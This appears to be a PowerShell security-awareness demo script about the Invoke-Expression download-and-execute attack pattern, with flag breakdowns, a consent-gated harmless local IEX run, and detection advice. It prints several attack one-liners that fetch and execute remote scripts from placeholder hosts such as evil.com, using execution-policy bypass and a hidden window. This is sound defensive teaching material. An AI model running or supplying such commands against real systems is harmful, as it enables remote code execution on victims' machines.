# ====================================
# INVOKE-EXPRESSION DEMO SCRIPT
# ====================================
# 
# This script safely demonstrates the Invoke-Expression pattern
# commonly used in PowerShell-based attacks without actually
# fetching from remote sources.
#

Write-Host "=" * 60 -ForegroundColor Yellow
Write-Host "INVOKE-EXPRESSION (IEX) ATTACK PATTERN DEMONSTRATION" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor Yellow

Write-Host "`nThis demo shows how attackers use IEX to execute remote PowerShell scripts." -ForegroundColor White

# Show different IEX patterns
Write-Host "`n1. COMMON ATTACK PATTERNS:" -ForegroundColor Red
Write-Host "   These are the actual commands attackers use (DO NOT RUN):" -ForegroundColor Yellow

$attackPatterns = @(
    'powershell -ep bypass -c "iex (iwr ''https://evil.com/script.ps1'').Content"',
    'powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri ''https://malicious.net/payload.ps1'' -UseBasicParsing).Content"',
    'powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(''https://bad.com/malware.ps1'')"',
    'powershell -w hidden -ep bypass -c "iex (iwr bit.ly/badscript -UseBasicParsing).Content"'
)

foreach ($pattern in $attackPatterns) {
    Write-Host "   $pattern" -ForegroundColor Red
}

Write-Host "`n2. BREAKDOWN OF THE ATTACK:" -ForegroundColor Cyan
Write-Host "   -ep bypass          = Bypass PowerShell execution policy" -ForegroundColor Gray
Write-Host "   -c                  = Execute the following command" -ForegroundColor Gray  
Write-Host "   iex                 = Invoke-Expression (execute code)" -ForegroundColor Gray
Write-Host "   iwr                 = Invoke-WebRequest (download)" -ForegroundColor Gray
Write-Host "   -UseBasicParsing    = Avoid dependencies on IE" -ForegroundColor Gray
Write-Host "   -w hidden           = Hide PowerShell window" -ForegroundColor Gray

Write-Host "`n3. SAFE DEMONSTRATION:" -ForegroundColor Green
Write-Host "   Instead of downloading from the internet, we'll show local execution..." -ForegroundColor Yellow

# Show the content that would be downloaded
Write-Host "`n   Content that would be fetched and executed:" -ForegroundColor Cyan
Write-Host "   ============================================" -ForegroundColor Gray

$demoScript = @'
Write-Host "MALICIOUS SCRIPT EXECUTING..." -ForegroundColor Red
Write-Host "System: $env:COMPUTERNAME" -ForegroundColor Yellow
Write-Host "User: $env:USERNAME" -ForegroundColor Yellow
Write-Host "This would normally do malicious things!" -ForegroundColor Red
'@

Write-Host $demoScript -ForegroundColor White

Write-Host "`n   ============================================" -ForegroundColor Gray

# Ask for permission to demonstrate
$response = Read-Host "`n   Execute this harmless demo code using IEX? (y/N)"

if ($response -eq 'y' -or $response -eq 'Y') {
    Write-Host "`n4. EXECUTING VIA INVOKE-EXPRESSION:" -ForegroundColor Green
    Write-Host "   Command: Invoke-Expression `$demoScript" -ForegroundColor Gray
    Write-Host "   Result:" -ForegroundColor Gray
    Write-Host "   -------" -ForegroundColor Gray
    
    # This safely demonstrates IEX without network access
    Invoke-Expression $demoScript
    
    Write-Host "`n   This is exactly how real attacks work, but with malicious code!" -ForegroundColor Red
} else {
    Write-Host "`n   Demo skipped. The IEX command would have executed the script above." -ForegroundColor Green
}

Write-Host "`n5. DETECTION AND PREVENTION:" -ForegroundColor Cyan
Write-Host "   • Monitor PowerShell command lines for suspicious patterns" -ForegroundColor White
Write-Host "   • Block execution of .ps1 files from email/downloads" -ForegroundColor White
Write-Host "   • Configure PowerShell execution policy appropriately" -ForegroundColor White
Write-Host "   • Use application whitelisting" -ForegroundColor White
Write-Host "   • Train users to recognize and report suspicious instructions" -ForegroundColor White
Write-Host "   • Implement endpoint detection and response (EDR)" -ForegroundColor White

Write-Host "`n6. REAL-WORLD CONTEXT:" -ForegroundColor Cyan
Write-Host "   Attackers deliver these commands through:" -ForegroundColor White
Write-Host "   • Phishing emails with 'ClickFix' instructions" -ForegroundColor White
Write-Host "   • Fake error popups on malicious websites" -ForegroundColor White
Write-Host "   • Tech support scam phone calls" -ForegroundColor White
Write-Host "   • Malicious QR codes" -ForegroundColor White
Write-Host "   • Social engineering on social media" -ForegroundColor White

Write-Host "`n" + "=" * 60 -ForegroundColor Yellow
Write-Host "REMEMBER: When in doubt, don't execute unknown PowerShell commands!" -ForegroundColor Red
Write-Host "Always verify with IT security before running scripts from emails." -ForegroundColor Green
Write-Host "=" * 60 -ForegroundColor Yellow